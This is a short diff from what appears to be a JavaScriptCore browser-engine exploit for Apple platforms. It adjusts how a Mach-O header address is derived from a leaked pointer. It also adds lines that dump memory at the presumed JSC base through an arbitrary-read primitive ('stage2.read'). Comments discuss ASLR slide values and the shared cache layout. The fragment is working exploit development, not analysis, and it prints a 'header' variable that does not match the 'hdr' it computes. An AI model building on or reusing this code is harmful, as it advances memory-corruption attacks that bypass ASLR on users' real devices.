@@ -657,7 +657,7 @@ function i2i(i,num) {
     i32[1] = i / BASE32
     return i32[num]
 }
-    var hdr = anchor - (i2i(anchor,0) & 0xfff);
+    var hdr = anchor - (i2i(anchor,0) & 0xffffff);
     print("header" + hex1(hdr));
    /* imp___stubs__atan2:        // atan2
 0000000189fccfbc         adrp       x16, #0x1dafc1000                           ; 0x1dafc1668@PAGE  this is lazy symbol pointer
@@ -676,6 +676,8 @@ function i2i(i,num) {
 		      //Max Slide         = 0x2F8A0000 (ASLR entropy: 16-bits)
 	      }
 	      print("vtable dump" + hexdump(stage2.read(vtable,0x30)))
+	      print("JSC Base? @ " + header);
+	      print("base dump?" + String.fromCharCode(...stage2.read(header, 0x100)))
 	     /* var cachestart = 0x180000000 + cacheslide; //Shared Region:                    4GB, address: 0x180000000 -> 0x280000000
 	      print("cachedump @ " + hex1(cachestart) + " : " + String.fromCharCode(...stage2.read(cachestart,0x100)));*/
 	
